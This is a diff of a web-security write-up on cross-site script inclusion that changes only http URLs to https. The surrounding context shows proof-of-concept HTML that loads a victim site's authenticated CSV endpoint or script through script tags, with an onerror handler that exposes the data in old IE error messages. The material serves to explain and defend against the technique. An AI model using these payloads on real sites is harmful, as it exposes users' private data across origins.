@@ -148,14 +148,14 @@ In this example, using the `___` columns as injection points and inserting JavaS
         // steal data
       }
     </script>
-    <script src="http://mail.google.com/mail/?_url_scrubbed_"></script>
+    <script src="https://mail.google.com/mail/?_url_scrubbed_"></script>
   </body>
 </html>
 ```
 
 ### 4. Sensitive Data Leakage via JavaScript Runtime Errors
 
-Browsers normally present standardized [JavaScript error messages](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors). However, in the case of IE9/10, runtime error messages provided additional details that could be used to leak data. For example, a website `victim.com` serves the following content at the URI `http://victim.com/service/csvendpoint` for authenticated users:
+Browsers normally present standardized [JavaScript error messages](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors). However, in the case of IE9/10, runtime error messages provided additional details that could be used to leak data. For example, a website `victim.com` serves the following content at the URI `https://victim.com/service/csvendpoint` for authenticated users:
 
 ```text
 HTTP/1.1 200 OK
@@ -172,7 +172,7 @@ This vulnerability could be exploited with the following:
 <!--error handler -->
 <script>window.onerror = function(err) {alert(err)}</script>
 <!--load target CSV -->
-<script src="http://victim.com/service/csvendpoint"></script>
+<script src="https://victim.com/service/csvendpoint"></script>
 ```
 
 When the browser tries to render the CSV content as JavaScript, it fails and leaks the sensitive data:
@@ -219,6 +219,6 @@ The sensitive data can be leaked with the following JavaScript code:
         div.innerHTML = resultString;
       };
     </script>
-    <script src="http://victim.com/..../javascript.js"></script>
+    <script src="https://victim.com/..../javascript.js"></script>
 ...
 ```
